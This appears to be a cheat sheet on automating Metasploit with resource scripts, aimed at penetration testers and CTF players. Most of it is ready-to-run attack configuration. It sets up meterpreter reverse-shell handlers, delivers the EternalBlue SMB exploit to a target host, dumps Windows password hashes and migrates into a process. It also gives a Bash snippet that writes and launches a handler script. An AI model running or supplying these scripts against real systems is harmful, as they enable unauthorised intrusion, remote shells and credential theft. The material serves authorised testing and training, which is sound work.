## 📜 Metasploit Resource Scripts

---

### 🧠 **What Are Resource Scripts?**

- **Resource scripts (`.rc` files)** are plain text files containing a list of `msfconsole` commands.
    
- They allow you to **automate** the setup and execution of Metasploit operations.
    
- Think of them like **batch scripts for Metasploit** — useful for repeating tasks, especially in engagements or labs.
    

---

### ✅ **Why Use Them?**

- Speed up configuration of exploits, listeners, and payloads.
    
- Automate **multi/handler** setups.
    
- Reproduce **complex attack chains**.
    
- Great for scripting **post-exploitation** tasks or **recon modules**.
    

---

### ⚙️ **Basic Structure Example**

Create a file named `handler.rc`:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j
```

To load it into `msfconsole`:

```bash
msfconsole -r handler.rc
```

---

### 🛠️ **Real-World Use Cases**

#### 1. **Automate Reverse Shell Handler**

```bash
# file: reverse_handler.rc
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 5555
set ExitOnSession false
exploit -j
```

---

#### 2. **Automate Exploit Delivery (Example)**

```bash
# file: exploit_runner.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.110
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

---

#### 3. **Post-Exploitation Module Chain**

```bash
# file: post_rc.rc
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/manage/migrate
set SESSION 1
set PID 1234
run
```

### 📂 **Tips & Tricks**

| Tip                                                           | Use |
| ------------------------------------------------------------- | --- |
| Store scripts in a `~/scripts/msf/` directory for easy access |     |
| Chain resource scripts together using `resource` command      |     |
| Echo dynamic values into `.rc` using Bash scripts             |     |
| Use in CTFs or repeat engagements to save time                |     |

---

### ⛓️ **Chain RC Scripts From Another Script**

```bash
resource /home/kali/scripts/start_listener.rc
resource /home/kali/scripts/launch_exploit.rc
```

---

### 🧪 **Sample Bash Auto-Launcher**

```bash
#!/bin/bash
echo "[*] Starting handler..."
msfconsole -r handler.rc
```

Make executable:

```bash
chmod +x start_handler.sh
```

---

### 🔥 Bonus: Dynamically Write `.rc` in Bash

```bash
echo "use exploit/multi/handler" > auto.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> auto.rc
echo "set LHOST 10.10.14.25" >> auto.rc
echo "set LPORT 4444" >> auto.rc
echo "exploit -j" >> auto.rc
msfconsole -r auto.rc
```
